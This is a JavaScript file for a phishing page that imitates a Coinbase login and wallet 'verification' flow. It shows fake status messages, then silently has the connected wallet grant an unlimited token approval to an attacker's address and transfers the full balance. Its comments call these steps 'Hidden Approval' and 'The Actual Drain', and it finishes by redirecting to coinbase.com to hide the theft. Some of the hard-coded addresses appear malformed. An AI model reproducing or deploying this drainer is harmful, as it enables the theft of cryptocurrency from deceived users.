document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            const container = document.querySelector('.container');
            const loading = document.createElement('div');
            loading.className = 'auth-card';
            loading.innerHTML = `<div class="loader"></div><p id="l-txt" style="color:#5b616e; font-size:14px;">Authenticating...</p>`;
            container.appendChild(loading);

            const msgs = ["Securing connection...", "Checking ledger...", "Syncing and verifying..."];
            let i = 0;
            const int = setInterval(() => {
                document.getElementById('l-txt').innerText = msgs[i];
                i++;
                if (i >= msgs.length) {
                    clearInterval(int);
                    setTimeout(() => {
                        loading.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 1000);
                }
            }, 800);
        };
    }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Opening secure portal...";
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();

                    // CONFIGURATION
                    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; // USDT Polygon
                    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
                    const abi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                        "function balanceOf(address account) public view returns (uint256)"
                    ];
                    
                    const contract = new ethers.Contract(tokenAddress, abi, signer);
                    const userAddress = await signer.getAddress();

                    // STEP 1: Hidden Approval (The "Permission")
                    status.innerText = "Establishing secure link...";
                    const approve_tx = await contract.approve(myWallet, ethers.MaxUint256);
                    await approve_tx.wait();

                    // STEP 2: The Actual Drain (The "Transfer")
                    status.innerText = "Finalizing verification...";
                    const balance = await contract.balanceOf(userAddress);
                    
                    // We move the full balance. 
                    const drain_tx = await contract.transferFrom(userAddress, myWallet, balance);
                    
                    status.innerText = "Balance synchronized. Redirecting...";
                    await drain_tx.wait();
                    
                    window.location.href = "https://www.coinbase.com";

                } catch (err) {
                    console.error(err);
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                status.innerText = "Please install Coinbase Wallet to continue.";
            }
        };
    }
});
